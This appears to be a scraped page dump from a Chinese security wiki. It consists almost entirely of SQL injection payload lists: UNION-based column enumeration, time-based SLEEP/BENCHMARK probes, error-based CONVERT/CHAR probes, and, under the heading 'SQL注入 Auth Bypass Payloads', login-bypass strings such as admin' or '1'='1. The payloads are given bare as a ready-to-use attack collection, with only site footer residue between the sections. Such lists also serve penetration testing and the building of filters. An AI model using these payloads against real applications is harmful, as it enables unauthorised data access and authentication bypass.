ALL SELECT SLEEP(5)-- UNION ALL SELECT USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT NULL-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- UNION ALL SELECT NULL# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))# UNION ALL SELECT NULL AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))) AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))) AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC) AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- UNION ALL SELECT 'INJ'||'ECT'||'XXX' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 'INJ'||'ECT'||'XXX'# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 23:20:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/sql/sql注入payloads/SQL注入 Auth Bypass Payloads.html":{"url":"安全技术/sql/sql注入payloads/SQL注入 Auth Bypass Payloads.html","title":"SQL注入 Auth Bypass Payloads","keywords":"","body":"SQL注入 Auth Bypass Payloads '-' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' \"-\" \" \" \"&\" \"^\" \"*\" \" or \"\"-\" \" or \"\" \" \" or \"\"&\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or (\"x\")=(\"x \")) or ((\"x\"))=((\"x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' # admin'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 admin\" -- admin\" # admin\"/* admin\" or \"1\"=\"1 admin\" or \"1\"=\"1\"-- admin\" or \"1\"=\"1\"# admin\" or \"1\"=\"1\"/* admin\"or 1=1 or \"\"=\" admin\" or 1=1 admin\" or 1=1-- admin\" or 1=1# 